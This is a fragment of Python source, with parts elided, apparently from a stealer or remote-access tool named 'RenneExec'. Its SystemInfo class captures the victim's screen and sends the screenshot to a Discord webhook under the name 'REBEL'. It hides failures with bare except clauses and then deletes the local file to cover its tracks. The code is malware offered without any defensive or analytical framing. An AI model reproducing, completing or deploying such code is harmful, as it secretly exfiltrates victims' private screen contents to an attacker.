...
from __RenneExec__.cfg.cfg import __PATH__
...
class SystemInfo():
    def __init__(self, webhook: str) -> None:
        ...
        try:
            os.makedirs(f"{__PATH__}")
        except:
            pass
        image.save(f"{__PATH__}\\screenshot.png")
        embed.set_image(url=f"attachment://{__PATH__}\\screenshot.png")

        try:
            webhook.send(
                embed=embed,
                file=File(f'{__PATH__}\\screenshot.png', filename=f'{__PATH__}\\screenshot.png'),
                username="REBEL",
                avatar_url="https://media.discordapp.net/attachments/1070581776537374721/1080930552967860315/static.png"
            )
        except:
            pass

        if os.path.exists(f"{__PATH__}\\screenshot.png"):
            os.remove(f"{__PATH__}\\screenshot.png")
